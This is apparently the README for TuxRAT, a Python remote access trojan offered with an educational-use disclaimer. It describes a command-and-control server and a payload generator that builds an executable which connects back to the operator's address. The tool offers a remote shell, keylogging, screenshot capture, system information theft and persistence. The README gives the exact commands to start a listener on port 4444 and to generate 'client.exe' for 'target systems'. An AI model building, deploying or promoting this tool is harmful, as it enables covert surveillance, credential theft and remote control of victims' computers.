# TuxRAT

**⚠️ DISCLAIMER: This tool is intended for educational purposes and security testing on your own systems or systems you have explicit permission to test. Using this software for unauthorized access to systems you don't own is illegal.**

TuxRAT is a Remote Access Tool (RAT) written in Python. It consists of a command & control server and a client payload that can be compiled into an executable file.

## Features

### Server-side
- **Session Management**: View and manage connected clients
- **Remote Shell**: Execute commands on remote systems
- **Keylogger**: Start/stop and retrieve keystroke logs
- **System Information**: Gather information about target systems
- **Screenshots**: Capture screenshots from remote systems
- **Multi-client Interface**: Support for multiple simultaneous connections

### Client-side
- **Auto-connection**: Connects to the command & control server
- **Command Execution**: Execute shell commands remotely
- **Keylogging**: Capture keystrokes
- **System Information Gathering**: Send system data to server
- **Screenshot Capture**: Take and send screenshots

## Requirements

### Python Dependencies
```
tabulate
PyInstaller
pillow (for screenshots)
pynput (for keylogger)
```

### System Requirements
- Python 3.6+
- Supported OS: Windows, Linux
- PyInstaller for compiling executables

## Installation

1. **Clone the repository**:
```bash
git clone https://github.com/itstepkam/TuxRat
cd tuxrat
python3 TuxRat.py -h
```

2. **Install dependencies**:
```bash
pip install -r requirements.txt
```

3. **Create required directories**:
```bash
mkdir mods tmp keylogs screenshots
```

## Usage

### Server Mode (Command & Control)

Start the server to listen for incoming connections:

```bash
python3 TuxRat.py bind --address 0.0.0.0 --port 4444
```

**Options:**
- `-a, --address`: IP address to bind to (default: 0.0.0.0)
- `-p, --port`: Port number to bind to (required)
- `-h, --help`: Show help message

### Generate Payload

Create a client payload to deploy on target systems:

```bash
python3 TuxRat.py generate --address 192.168.1.100 --port 4444 --output client.exe
```

**Options:**
- `-a, --address`: Server IP address for client to connect to (required)
- `-p, --port`: Server port for client to connect to (required)
- `-o, --output`: Output file path (required)
- `-s, --source`: Generate Python source instead of compiled executable
- `--persistence`: Enable auto-start on reboot (under development)

## Server Interface

Once the server is running, you'll have access to a menu-driven interface:

### Main Menu
- **1. Show Sessions**: Display all connected clients
- **2. Connect to Client**: Select and connect to a specific client
- **3. Disconnect**: Disconnect from current client
- **0. Clear Screen**: Clear the terminal
- **99. Exit**: Shut down the server

### Client Menu (when connected to a client)
- **1. Show Sessions**: Display all connected clients
- **2. Connect to Client**: Switch to another client
- **3. Disconnect**: Disconnect from current client
- **4. Launch Shell**: Open interactive shell on target
- **5. Keylogger Menu**: Access keylogger functions
- **6. System Information**: Get target system details
- **7. Take Screenshot**: Capture target's screen
- **0. Clear Screen**: Clear the terminal
- **99. Exit**: Shut down the server

### Keylogger Menu
- **1. Turn Keylogger ON**: Start capturing keystrokes
- **2. Turn Keylogger OFF**: Stop capturing keystrokes
- **3. Dump Keylogs**: Save captured keystrokes to file
- **0. Back**: Return to client menu

## File Structure

```
TuxRAT/
├── TuxRat.py          # Main server application
├── mods/              # Client payload modules
│   ├── imports.py     # Required imports for client
│   ├── client.py      # Client core functionality
│   ├── main.py        # Client main execution
│   ├── sysinfo.py     # System information gathering
│   ├── screenshot.py  # Screenshot functionality
│   └── persistence.py # Persistence mechanisms
├── tmp/               # Temporary files during compilation
├── keylogs/           # Stored keylogger output
└── screenshots/       # Stored screenshots
```

## Output Files

- **Keylogs**: Saved to `keylogs/[CLIENT_IP]/[TIMESTAMP].txt`
- **Screenshots**: Saved to `screenshots/[CLIENT_IP]/[TIMESTAMP].png`

## Security Considerations

- This tool uses base64 encoding for data transmission (not encryption)
- Communications are sent in plaintext over the network
- The tool creates directories and files on the local system
- Antivirus software may detect generated payloads

## Legal Notice

This software is provided for educational and authorized testing purposes only. Users are responsible for complying with applicable laws and regulations. The authors assume no liability for misuse of this software.

## Troubleshooting

### Common Issues

1. **"Files missing to generate the payload!"**
   - Ensure the `mods/` directory exists with all required module files

2. **"Unable to bind to address"**
   - Check if the port is already in use
   - Verify you have permission to bind to the specified address

3. **Client not connecting**
   - Verify firewall settings allow connections on the specified port
   - Check that the server address and port are correct in the payload

4. **PyInstaller compilation errors**
   - Ensure PyInstaller is properly installed
   - Check that all dependencies are available

## Version

Current version: 1.0

## Author

- https://t.me/ErnestoMiyake
